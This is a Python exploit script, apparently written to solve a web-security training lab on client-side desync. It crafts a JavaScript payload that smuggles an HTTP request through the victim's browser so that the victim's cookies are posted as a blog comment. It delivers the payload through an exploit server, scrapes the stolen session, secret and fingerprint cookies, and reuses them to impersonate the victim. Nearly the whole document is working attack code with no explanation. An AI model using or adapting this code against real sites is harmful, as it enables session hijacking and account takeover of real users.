# Client-side desync

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings

from bs4 import BeautifulSoup

TIMEOUT = 5

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(r):
		time.sleep(1)
		soup = BeautifulSoup(r.content, 'html.parser')
		csrf_input = soup.find("input", {'name':'csrf'})
		csrf = csrf_input['value']
		print('[+] Found CSRF Token:\t%s' % csrf)
		return csrf

def store_payload(url, payload, attacker):
	store_exploit_path = attacker
	store_exploit_data = {
			"formAction": "STORE",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = requests.post(store_exploit_path, data=store_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	deliver_exploit_data = {
			"formAction": "DELIVER_TO_VICTIM",
			"urlIsHttps": "on",
			"responseFile": "/exploit",
			"responseHead": """HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8""",
			"responseBody": payload
	}
	r = requests.post(store_exploit_path, data=deliver_exploit_data, verify=False, proxies=proxies)
	time.sleep(1)
	print('\n[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('\n[+] Using payload:\n%s' % payload)
	print('\n[+] Delivered to the victim via:\t%s' % store_exploit_path)
	return r

def build_payload(url, session, lab, csrf, i):
	length = 100 * i
	payload_to_send = f"""<script>fetch('https://{url}', {{
		\tmethod: 'POST',
		\tbody: 'POST /en/post/comment HTTP/1.1\\r\\nHost: {url}\\r\\nCookie: session={session}; _lab_analytics={lab}\\r\\nContent-Length: {length}\\r\\nContent-Type: x-www-form-urlencoded\\r\\nConnection: keep-alive\\r\\n\\r\\ncsrf={csrf}&postId=1&name=gwyo&email=gwyo@attacker.com&website=https://attacker.com&comment=',
		\tmode: 'cors',
		\tcredentials: 'include',
	}}).catch(() => {{
		\tfetch('https://{url}/capture-me', {{
		\tmode: 'no-cors',
		\tcredentials: 'include'
	}})
}})</script>"""
	return payload_to_send

def main():
	print('[+] Lab: Client-side desync')
	try:
		url = sys.argv[1].strip()
		attacker = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <ATTACKER>' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False, proxies=proxies, verify=False)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
		sys.exit(-1)
	else:
		time.sleep(1)
		parsed_url = urllib.parse.urlparse(url)
		print(parsed_url)
		subdomain = parsed_url.netloc
		if parsed_url.port:
			port = parsed_url.port
		elif parsed_url.scheme == "https":
			port = 443
		elif parsed_url == "http":
			port = 80
		r = s.get(url + '/en', allow_redirects=False, proxies=proxies, verify=False)
		time.sleep(1)
		session = r.cookies.get('session')
		lab = r.cookies.get('_lab_analytics')
		print('[+] Trying craft HTTP Request attack to reveal cookies...\n')
		time.sleep(1)
		cookies = {"session": session, "_lab_analytics": lab}
		r = s.get(f'https://{subdomain}/en/post?postId=1', proxies=proxies, verify=False, cookies=cookies)
		print(r)
		time.sleep(1)
		csrf = get_csrf_token(r)
		print('[+] Found Session cookie:\t%s' % session)
		print('[+] Found Lab Analytics cookie:\t%s' % lab)
		solved = None
		while solved is None:
			for i in range(1, 11):
				print("------------------------------------------------------")
				payload = build_payload(subdomain, session, lab, csrf, i)
				r = store_payload(subdomain, payload, attacker)
				time.sleep(TIMEOUT)
				r = requests.get(f'https://{subdomain}/en/post?postId=1', proxies=proxies, verify=False)
				time.sleep(1)
				res = r.text
				if re.search('; secret=(.*);', res) and re.search('; session=(.*); ', res):
					fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
					secret = re.search('; secret=(.*); session', res).group(1)
					session = re.search('; session=(.*); ', res).group(1)
					print('[+] Found Fingerprint:\t%s' % fingerprint)
					print('[+] Found Secret:\t%s' % secret)
					print('[+] Found Session:\t%s' % session)
					break
			if len(secret) == len(session) == len(fingerprint):
				print('[+] Trying impersonate user with his cookies...\n')
				s.cookies.clear()
				cookies = {"victim-fingerprint": fingerprint, "session": session, "secret": secret}

				r = requests.get('https://' + subdomain + '/my-account' , verify=False, cookies=cookies, proxies=proxies)
			time.sleep(2)
			r = requests.get(url, verify=False, proxies=proxies)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
				solved = True

if __name__ == "__main__":
	main()
